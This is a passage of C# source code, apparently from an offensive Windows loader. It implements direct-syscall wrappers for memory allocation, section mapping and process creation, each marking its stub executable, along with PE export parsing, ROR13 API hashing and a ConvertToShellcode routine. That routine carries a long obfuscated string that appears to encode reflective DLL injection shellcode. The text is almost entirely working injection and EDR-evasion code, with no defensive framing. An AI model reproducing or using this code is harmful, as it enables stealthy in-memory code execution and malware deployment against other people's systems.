                ZwWriteVirtualMemoryX ZwWriteVirtualMemoryFunc = (ZwWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwWriteVirtualMemoryX));
                return (NTSTATUS)ZwWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
        }
    }


    public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                NtAllocateVirtualMemoryX NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtAllocateVirtualMemoryX));
                return (NTSTATUS)NtAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
        }
    }

    public static NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 5 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                NtCreateSectionX NtCreateSectionFunc = (NtCreateSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCreateSectionX));
                return (NTSTATUS)NtCreateSectionFunc(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
            }
        }
    }

    public static NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 6 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                NtMapViewOfSectionX NtMapViewOfSectionFunc = (NtMapViewOfSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtMapViewOfSectionX));
                return (NTSTATUS)NtMapViewOfSectionFunc(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
            }
        }
    }

    public static NTSTATUS ZwCreateProcess( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort)
    {
        byte [] syscall = GetOSVersionAndReturnSyscall( 7 );
        unsafe
        {
            fixed (byte* ptr = syscall)
            {
                IntPtr allocMemAddress = (IntPtr)ptr;
                IntPtr allocMemAddressCopy = (IntPtr)ptr;
                MemoryProtection oldProtection;
                uint size = (uint)syscall.Length;
                IntPtr sizeIntPtr = (IntPtr)size;
                NTSTATUS status = ZwProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                ZwCreateProcessX ZwCreateProcessFunc = (ZwCreateProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwCreateProcessX));
                return (NTSTATUS)ZwCreateProcessFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, InheritObjectTable, SectionHandle, DebugPort, ExceptionPort);
            }
        }
    }

    public class PE
    {
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        //[StructLayout(LayoutKind.Sequential, Pack = 1)]
        [StructLayout(LayoutKind.Explicit)]
        unsafe struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            public fixed byte Name[8];
            [FieldOffset(8)]
            public uint PhysicalAddress;
            [FieldOffset(8)]
            public uint VirtualSize;
            [FieldOffset(12)]
            public uint VirtualAddress;
            [FieldOffset(16)]
            public uint SizeOfRawData;
            [FieldOffset(20)]
            public uint PointerToRawData;
            [FieldOffset(24)]
            public uint PointerToRelocations;
            [FieldOffset(28)]
            public uint PointerToLinenumbers;
            [FieldOffset(32)]
            public ushort NumberOfRelocations;
            [FieldOffset(34)]
            public ushort NumberOfLinenumbers;
            [FieldOffset(36)]
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_EXPORT_DIRECTORY
        {
            public uint Characteristics;
            public uint TimeDateStamp;
            public ushort MajorVersion;
            public ushort MinorVersion;
            public uint Name;
            public uint Base;
            public uint NumberOfFunctions;
            public uint NumberOfNames;
            public uint AddressOfFunctions;     // RVA from base of image
            public uint AddressOfNames;         // RVA from base of image
            public uint AddressOfNameOrdinals;  // RVA from base of image
        }

        enum IMAGE_DOS_SIGNATURE : ushort
        {
            DOS_SIGNATURE = 0x5A4D,      // MZ
            OS2_SIGNATURE = 0x454E,      // NE
            OS2_SIGNATURE_LE = 0x454C,      // LE
        }

        enum MagicType : ushort
        {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
            IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b,
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_DOS_HEADER
        {
            public IMAGE_DOS_SIGNATURE e_magic;        // Magic number
            public ushort e_cblp;                      // public bytes on last page of file
            public ushort e_cp;                        // Pages in file
            public ushort e_crlc;                      // Relocations
            public ushort e_cparhdr;                   // Size of header in paragraphs
            public ushort e_minalloc;                  // Minimum extra paragraphs needed
            public ushort e_maxalloc;                  // Maximum extra paragraphs needed
            public ushort e_ss;                        // Initial (relative) SS value
            public ushort e_sp;                        // Initial SP value
            public ushort e_csum;                      // Checksum
            public ushort e_ip;                        // Initial IP value
            public ushort e_cs;                        // Initial (relative) CS value
            public ushort e_lfarlc;                    // File address of relocation table
            public ushort e_ovno;                      // Overlay number
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
            public string e_res;                       // May contain 'Detours!'
            public ushort e_oemid;                     // OEM identifier (for e_oeminfo)
            public ushort e_oeminfo;                   // OEM information; e_oemid specific
            [MarshalAsAttribute(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;                      // Reserved public ushorts
            public Int32 e_lfanew;                    // File address of new exe header
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER
        {
            //
            // Standard fields.
            //

            public MagicType Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public uint SizeOfStackReserve;
            public uint SizeOfStackCommit;
            public uint SizeOfHeapReserve;
            public uint SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Public;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_OPTIONAL_HEADER64
        {
            public MagicType Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Public;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        struct IMAGE_NT_HEADERS
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER OptionalHeader;
        }

        public static unsafe class InteropTools
        {
            private static readonly Type SafeBufferType = typeof(SafeBuffer);
            public delegate void PtrToStructureNativeDelegate(byte* ptr, TypedReference structure, uint sizeofT);
            public delegate void StructureToPtrNativeDelegate(TypedReference structure, byte* ptr, uint sizeofT);
            const BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Static;
            private static readonly MethodInfo PtrToStructureNativeMethod = SafeBufferType.GetMethod("PtrToStructureNative", flags);
            private static readonly MethodInfo StructureToPtrNativeMethod = SafeBufferType.GetMethod("StructureToPtrNative", flags);
            public static readonly PtrToStructureNativeDelegate PtrToStructureNative = (PtrToStructureNativeDelegate)Delegate.CreateDelegate(typeof(PtrToStructureNativeDelegate), PtrToStructureNativeMethod);
            public static readonly StructureToPtrNativeDelegate StructureToPtrNative = (StructureToPtrNativeDelegate)Delegate.CreateDelegate(typeof(StructureToPtrNativeDelegate), StructureToPtrNativeMethod);

            private static readonly Func<Type, bool, int> SizeOfHelper_f = (Func<Type, bool, int>)Delegate.CreateDelegate(typeof(Func<Type, bool, int>), typeof(Marshal).GetMethod("SizeOfHelper", flags));

            public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr, int size)
            {
                StructureToPtrNative(structure, (byte*)ptr, unchecked((uint)size));
            }

            public static void StructureToPtrDirect(TypedReference structure, IntPtr ptr)
            {
                StructureToPtrDirect(structure, ptr, SizeOf(__reftype(structure)));
            }

            public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure, int size)
            {
                PtrToStructureNative((byte*)ptr, structure, unchecked((uint)size));
            }

            public static void PtrToStructureDirect(IntPtr ptr, TypedReference structure)
            {
                PtrToStructureDirect(ptr, structure, SizeOf(__reftype(structure)));
            }

            public static void StructureToPtr<T>(ref T structure, IntPtr ptr)
            {
                StructureToPtrDirect(__makeref(structure), ptr);
            }

            public static void PtrToStructure<T>(IntPtr ptr, out T structure)
            {
                structure = default(T);
                PtrToStructureDirect(ptr, __makeref(structure));
            }

            public static T PtrToStructure<T>(IntPtr ptr)
            {
                T obj;
                PtrToStructure(ptr, out obj);
                return obj;
            }

            public static int SizeOf<T>(T structure)
            {
                return SizeOf<T>();
            }

            public static int SizeOf<T>()
            {
                return SizeOf(typeof(T));
            }

            public static int SizeOf(Type t)
            {
                return SizeOfHelper_f(t, true);
            }
        }

        public static IntPtr Rva2Offset(uint dwRva, IntPtr PEPointer)
        {
            bool is64Bit = false;
            ushort wIndex = 0;
            ushort wNumberOfSections = 0;
            IntPtr imageSectionPtr;
            IMAGE_SECTION_HEADER SectionHeader;
            int sizeOfSectionHeader = Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER));

            IMAGE_DOS_HEADER dosHeader = InteropTools.PtrToStructure<IMAGE_DOS_HEADER>(PEPointer);

            IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);

            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));
            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));

            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;


            if (is64Bit)
            {
                imageSectionPtr = (IntPtr)(((Int64)NtHeadersPtr + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS64), "OptionalHeader") + (Int64)imageNtHeaders64.FileHeader.SizeOfOptionalHeader));
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
                wNumberOfSections = imageNtHeaders64.FileHeader.NumberOfSections;
            }
            else
            {
                imageSectionPtr = (IntPtr)(((Int64)NtHeadersPtr + (Int64)Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS), "OptionalHeader") + (Int64)imageNtHeaders32.FileHeader.SizeOfOptionalHeader));
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(imageSectionPtr, typeof(IMAGE_SECTION_HEADER));
                wNumberOfSections = imageNtHeaders32.FileHeader.NumberOfSections;
            }

            if (dwRva < SectionHeader.PointerToRawData)
                return (IntPtr)((UInt64)dwRva + (UInt64)PEPointer);

            for (wIndex = 0; wIndex < wNumberOfSections; wIndex++)
            {
                SectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((IntPtr)((uint)imageSectionPtr + (uint)(sizeOfSectionHeader * (wIndex))), typeof(IMAGE_SECTION_HEADER));
                if (dwRva >= SectionHeader.VirtualAddress && dwRva < (SectionHeader.VirtualAddress + SectionHeader.SizeOfRawData))
                    return (IntPtr)((UInt64)(dwRva - SectionHeader.VirtualAddress + SectionHeader.PointerToRawData) + (UInt64)PEPointer);
            }

            return IntPtr.Zero;
        }

        public static unsafe bool Is64BitDLL(byte[] dllBytes)
        {
            bool is64Bit = false;
            GCHandle scHandle = GCHandle.Alloc(dllBytes, GCHandleType.Pinned);
            IntPtr scPointer = scHandle.AddrOfPinnedObject();
            Int32 headerOffset = Marshal.ReadInt32(scPointer, 60);
            UInt16 magic = (UInt16)Marshal.ReadInt16(scPointer, headerOffset + 4);
            if (magic == (UInt16)512 || magic == (UInt16)34404)
                is64Bit = true;
            scHandle.Free();
            return is64Bit;
        }

        public static unsafe IntPtr GetProcAddressR(IntPtr PEPointer, string functionName)
        {
            bool is64Bit = false;

            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(PEPointer, typeof(IMAGE_DOS_HEADER));
            IntPtr NtHeadersPtr = (IntPtr)((UInt64)PEPointer + (UInt64)dosHeader.e_lfanew);
            var imageNtHeaders64 = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS64));
            var imageNtHeaders32 = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(NtHeadersPtr, typeof(IMAGE_NT_HEADERS));
            if (imageNtHeaders64.Signature != 0x00004550) {
                System.Windows.Forms.MessageBox.Show("Invalid IMAGE_NT_HEADER signature.");
                throw new ApplicationException("Invalid IMAGE_NT_HEADER signature.");
            }
            if (imageNtHeaders64.OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC) is64Bit = true;
            IntPtr ExportTablePtr;
            if (is64Bit)
            {
                if ((imageNtHeaders64.FileHeader.Characteristics & 0x2000) != 0x2000) {
                    System.Windows.Forms.MessageBox.Show("File is not a DLL, Exiting.");
                    throw new ApplicationException("File is not a DLL, Exiting.");
                }
                ExportTablePtr = (IntPtr)((UInt64)PEPointer + (UInt64)imageNtHeaders64.OptionalHeader.ExportTable.VirtualAddress);
            }
            else
            {
                if ((imageNtHeaders32.FileHeader.Characteristics & 0x2000) != 0x2000) {
                    System.Windows.Forms.MessageBox.Show("File is not a DLL, Exiting.");
                    throw new ApplicationException("File is not a DLL, Exiting.");
                }
                ExportTablePtr = (IntPtr)((UInt64)PEPointer + (UInt64)imageNtHeaders32.OptionalHeader.ExportTable.VirtualAddress);
            }
            IMAGE_EXPORT_DIRECTORY ExportTable = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ExportTablePtr, typeof(IMAGE_EXPORT_DIRECTORY));
            for (int i = 0; i < ExportTable.NumberOfNames; i++)
            {
                IntPtr NameOffsetPtr = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfNames);
                NameOffsetPtr += (i * Marshal.SizeOf(typeof(UInt32)));
                IntPtr NamePtr = (IntPtr)((ulong)PEPointer + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint)));
                string Name = Marshal.PtrToStringAnsi(NamePtr);
                if (Name.Contains(functionName))
                {
                    IntPtr AddressOfFunctions = (IntPtr)((ulong)PEPointer + (ulong)ExportTable.AddressOfFunctions);
                    IntPtr OrdinalRvaPtr = (IntPtr)((ulong)PEPointer + (ulong)(ExportTable.AddressOfNameOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))));
                    UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
                    IntPtr FuncOffsetLocation = (IntPtr)((ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32))));
                    IntPtr FuncLocationInMemory = (IntPtr)((ulong)PEPointer + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32)));
                    return FuncLocationInMemory;
                }
            }
            return IntPtr.Zero;
        }
    }

    class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr ReflectiveLoader();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate bool ExportedFunction(IntPtr userData, uint userLength);

        public static uint Ror(uint val, int r_bits, int max_bits)
        {
            return (val >> r_bits) | (val << (max_bits - r_bits));
        }

        public static uint HashFunction(string name)
        { // Rotates each bit n positions to the right
            uint functionHash = 0;
            name += "\x00";
            foreach (char c in name)
            {
                functionHash = Ror(functionHash, 13, 32);
                functionHash += c;
            }
            return functionHash;
        }

        public static byte[] ConvertToShellcode(byte[] dllBytes, uint functionHash, byte[] userData, uint flags)
        {

            //MARKER:S
            string rdiShellcode32str = " /   / ?  /   /      ? /-/        ?-/        /   ?-/        /     ?-/        /      ?-/        /       ? /        /     ?-/       /      ? / /         ?-/   /        ?-/-/       ?  /   /  ? / /-?-/-/      ?-/-/-?-/-/-? /   /         ?  /    /        ? /        /     ?-/       /   ?  /    /       ?-/-/  ? /  /-? /   /       ? /  /    ?-/   /      ?-/    /-?  /   /  ?-/         /    ?-/-/      ?-/-/-?-/-/-? /   /         ?  /    /-? /        /     ?-/        /        ? /      /    ?-/        /   ?  /  /         ? /   /       ? / /      ?-/   /      ?-/    /    ?  /   /  ?-/       /        ?-/-/      ?-/-/-?-/-/-? /   /         ?  / /      ? /        /     ?-/ /      ?  /  /     ? /   /        ? /         /     ? /   /       ?-/         /  ?-/   /      ?-/   /  ?  /   /  ?-/      /  ?-/-/      ?-/-/-?-/-/-? /        /     ? /       /     ? /       /       ?-/         /  ? /    /        ? /   /       ?-/      /        ?-/   /      ?-/    /        ?  /   /  ?-/    /        ?-/-/      ?-/-/-?-/-/-? /        /     ?-/     / ?-/-/-? /     /        ? /    /         ? /   /       ?-/      /        ?-/   /      ?-/     /  ?  /   /  ?-/   /    ?-/-/      ?-/-/-?-/-/-? /        /     ?-/      /        ?  /    /-?-/     /   ?  /  /    ? /   /         ?  /   /  ?  /   /  ?-/  /  ?-/-/      ?-/-/-?-/-/-? /   /       ?-/      /        ?-/   /      ?-/      /    ? /   /   ?  /     /     ?-/ /     ? /   /  ?-/-/-?-/-/      ?-/-/-?-/-/-? /   /   ?  /    /      ?-/ /     ? /   /  ?  /    /        ?-/-/     ?-/-/-?-/-/-? /   /   ?  / /         ?-/ /     ? /   /  ?  /    /-?-/-/     ?-/-/-?-/-/-? /   / ? /  /    ?-/   /      ?-/    /        ?-/-/-?-/ /     ? /   /  ?  /  /         ?-/-/     ?-/-/-?-/-/-? /   / ? /  /    ?-/   /      ?-/     /  ?-/-/-?-/ /     ? /   /  ?  / /        ?-/-/     ?-/-/-?-/-/-? /   /   ?  /   /       ?-/ /     ? /   /  ?  / /-?-/-/     ?-/-/-?-/-/-? /   /   ? /         /  ?-/ /     ? /   /  ?  /-/  ?-/-/     ?-/-/-?-/-/-? /   /         ? /   /  ?-/   /      ? /  /        ?-/-/-?-/-/-?-/-/-? /   /         ? / /  ?-/      /-?-/-/   ?  /    /-? /  /         ?-/      /  ?-/        /-?-/      /         ?-/-/-?-/-/-?-/ /     ? /   /   ? /       /        ?-/-/     ?-/-/-?-/-/-? /        /    ?-/       /      ?-/-/ ?-/-/-?-/-/-? /-/  ?-/     /       ?-/       /-?-/-/    ?-/ /     ? /   /   ? /      /   ?-/-/     ?-/-/-?-/-/-?  /    /      ?-/       /-?-/     /      ?-/-/ ?-/ /     ? /   /   ? /     /   ?-/-/     ?-/-/-?-/-/-?-/ /     ? /        /   ?-/        /      ?-/-/      ?-/     / ?  /     /     ?-/ /     ? /        /   ?-/       /-?-/  /-? /   /   ?  / /-? / /      ?-/   /    ? /    / ?-/       /        ?-/   /      ?-/-/   ?  /-/-? /   / ? /  / ?-/-/    ?-/-/-? /   /         ?-/-/ ? / /       ?-/-/     ?-/-/   ?-/       /-?-/     /      ?  /   /     ?-/-/   ?-/-/   ?-/      /     ?-/-/    ?-/     /         ? /         /         ?-/ /     ?-/       / ?  /    /        ? /   / ? /         /   ?-/    /-? /   / ?  /   /    ?-/-/ ? / /       ?  /  /       ? /    / ?-/      /        ?-/   /      ?-/        /        ?-/        /-?  /     /     ?  / /   ? /   /         ?-/       /      ?-/   /      ?-/         /  ? /    / ?-/        / ?  /     /     ? /    / ? /-/     ?  /     /     ?  /    /       ?  / /-?-/-/   ? / /-?-/        /-? /    / ?-/      /     ?  /     /     ?-/-/   ? /         /         ?-/   /     ?  /   /    ?-/   /     ? /         /    ?-/     /         ?  /   /  ?-/ /     ? /   /   ?-/      /      ?-/-/     ?-/-/-?-/-/-? /-/      ?-/-/    ? /         / ?-/-/-?-/    /        ?-/-/-?-/-/-?-/        /       ?-/        /     ?  /     /     ? / /        ?-/     /  ?  /     /     ?  / / ? /   /         ?  / /      ? /   /       ?-/         /  ?-/   /      ?-/   /      ? /   /   ?  / /         ? / /       ?-/ /     ? /-/      ?-/-/    ?-/        /       ?-/        /     ?-/        /-?  /     /     ?-/        /    ?-/   /      ?-/    /        ? /   /         ?  / /      ? /   /       ?-/      /        ?-/   /      ?-/   /      ?  /    /      ? /   /  ?-/   /      ? /    /    ?-/-/-?-/-/-?-/-/-?-/-/ ? / /      ?-/    /-? /   /         ? /    /        ?-/   /      ? /  /        ?-/-/-?-/-/-?-/-/-? /   /         ?-/      /      ?-/      /-? /   /       ?-/      /       ?-/      /-? /   /         ?-/       /    ?-/      /-?-/     /         ?-/       /        ?-/        /    ? / /     ?-/    /         ? /    / ?-/      /-?-/ / ?-/    /   ?  / / ? /   /        ?-/-/    ?-/     /        ?-/      /     ? /   /      ?-/-/       ?-/       / ?-/     /         ?-/       /        ?-/        /    ? / /    ?  /    /    ?  /   /     ?-/   /-?-/     / ?  /     /     ?-/     /       ? /  /      ?-/        /    ? / /        ?-/  /   ? /   /         ? /    /        ?-/   /      ? /  /        ?-/-/-?-/-/-?-/-/-? /   /         ?  /-/   ?-/    /   ?  / / ? /   /        ?-/-/    ?-/ /       ?-/       / ? /   /      ?-/-/ ?-/      /     ?-/     /         ? /  /      ?-/        /    ? / /    ?  /    /    ? /   /         ? /-/       ?-/      /-?-/     / ?  /-/ ?-/-/   ?  /   /     ? /   /       ?-/       /      ?-/   /      ?-/  /        ?-/     / ?  / /-? /   /       ? /-/        ?-/   /      ?-/  /-?-/ /     ? /        /   ?-/      /         ?-/  /-? /-/  ?-/     /         ?-/        /     ?-/-/      ? / /     ?-/      /    ? /    / ? / /       ?-/    /-?-/-/   ?  /    /-?-/     / ?  /     /     ?-/     /       ?-/      /  ? / /        ?-/   /       ? /   /         ? /       /  ?-/   /      ? /  /        ?-/-/-?-/-/-?-/-/-? /   /         ?-/       /-?-/-/    ? /    / ?-/  /-?-/     /         ? /   /         ?-/       /        ?  /     /  ?-/-/   ? /         /         ?-/       / ? /   /        ?-/-/    ?-/    /-? /   /      ?-/-/    ?-/ /-?-/     /         ?-/      /  ? / /    ?  /   /    ? /   /         ? /-/        ?-/   /      ?-/  /-? /   /         ?-/       /      ?-/   /      ?-/  /        ?-/ /     ? /        /   ?-/      /         ?-/-/      ?-/      /     ? /   / ? /         /        ?-/    /-? /   /       ?-/       /      ?-/   /      ?-/  /        ?-/     /         ?  /-/-? / /    ? /         /       ? /-/      ?-/-/ ? /   /         ?  /     / ?-/         /    ? /   /       ? / /      ?-/   /      ?-/   /  ?-/    /   ? /  /     ?-/     /  ? / /      ? /  /   ? /   / ? /        /         ? /      /    ?-/-/-?-/-/-?-/-/-?-/-/-? / /      ? / /    ? /   /         ? /    /         ? /      /-?-/-/-?-/-/-?-/-/-?-/-/   ?  / / ? /   / ?-/     /        ?-/-/-? / /      ? /-/ ? /-/      ?-/-/  ?-/         /   ? /    / ? / /    ?-/-/        ?  /   /     ?-/       /-?-/ /     ? /        /   ?-/ /    ? /-/  ? /   /         ? /         /   ? /-/  ? /         /   ?  /   /  ?-/ /  ? /-/  ? /   / ?  /    /        ?-/ /-? / /      ?-/-/      ? /-/  ? /   / ?  /    /        ?-/-/   ? / /       ?-/ /   ? /  /         ?  /  /     ?  /     /     ?-/ /     ?-/-/-?-/-/-?-/-/   ?-/ /-?-/-/ ?-/      /-?-/  /     ?  /   /     ?-/   /   ? /-/  ?-/     /         ?-/      /        ?-/   /      ?-/   /  ? / /       ?-/-/       ? /   /         ? /         /         ? /         /   ?  /   /  ?-/ /      ?  /   /     ?-/-/        ? /-/  ?-/     /         ? /         /       ? / /       ?-/ /    ?-/ /     ? /        /   ? /         /         ? /  /         ?  /  /     ?  /     /     ?-/ /     ?-/-/-?-/-/-?-/-/   ?-/ /-?-/-/ ?-/-/    ?-/  /     ?-/-/   ?  /    /     ? /   /         ?-/      /      ?-/-/    ?-/-/   ? /         /    ?-/     /         ?  /    /-? / /       ? /       /       ? /   / ?-/      /  ?-/-/-? /   /         ?  / /    ? / /       ? /      /     ? /   /         ? /-/        ?-/   /      ?-/  /-?-/     / ?  /    /      ?-/       /-? /   / ? /        /         ? /   /  ?-/-/-?-/-/-?-/-/-?-/-/-?-/ /     ? /   /  ? /     / 